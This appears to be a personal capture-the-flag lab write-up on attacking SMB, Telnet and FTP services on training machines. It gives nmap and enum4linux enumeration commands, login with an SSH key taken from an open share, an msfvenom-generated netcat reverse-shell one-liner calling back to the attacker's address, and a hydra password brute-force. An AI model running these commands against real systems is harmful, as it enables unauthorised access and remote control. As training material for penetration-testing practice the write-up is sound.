# Network Services
# Data: 20.09.2020

IP:`10.10.236.18`, `10.10.105.133`, `10.10.220.38`


-----------
Tools:
- nmap
- enum4linux
- smbclient //[IP]/[SHARE]
- msfvenom
- hydra

----------- SMB -----------
IP:`10.10.236.18`

1. nmap: `nmap -sC -sV -vv -p- -oN initial/ssh/nmap 10.10.236.18` 
	results in initial/ssh/nmap
2. enumeration: `enum4linux -A 10.10.236.18 | tee initial/ssh/enum4linux.log`
	results in initial/ssh/enum4linux.log
3. acces SMB share using: `smbclient //10.10.236.18/profiles`
	- investigate files found name `John Cactus`
	- found id_rsa and id_rsa.pub files
	- found login: `cactus`
	- connected via `ssh -i id_rsa cactus@10.10.236.18`
	- found flag in smb.txt 


------------ TELNET -----------
IP:`10.10.105.133`

1. namp: `nmap -sC -sV -vv -p- -A -oN initial/telnet/nmap 10.10.105.133`
	results in initial/telnet/nmap
	- one port open: `8012`, backdoor for "SKIDY"
2. ping back local machine

3. create payload using msfvenom `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
	- `mkfifo /tmp/hptewir; nc 10.8.106.217 4444 0</tmp/hptewir | /bin/sh >/tmp/hptewir 2>&1; rm /tmp/hptewir`

4. start netcat `nc -lvp 4444`

5. .RUN <payload> on remote machine

6. found flag in flag.txt in root dir


------------ FTP -----------
IP:`10.10.220.38`

1. nmap: `nmap -sC -sV -vv -p- -A -oN initial/ftp/nmap`
	results in initial/ftp/nmap

2. ftp anonymous@10.10.220.38
	found file PUBLIC_NOTICE.txt
	possible login: mike

3. enumerate with hydra: `hydra -l mike -P /opt/rockyou.txt ftp://10.10.220.38`
	found password: password

credentials: "mike:password"

4. login with found credentials, found ftp.txt


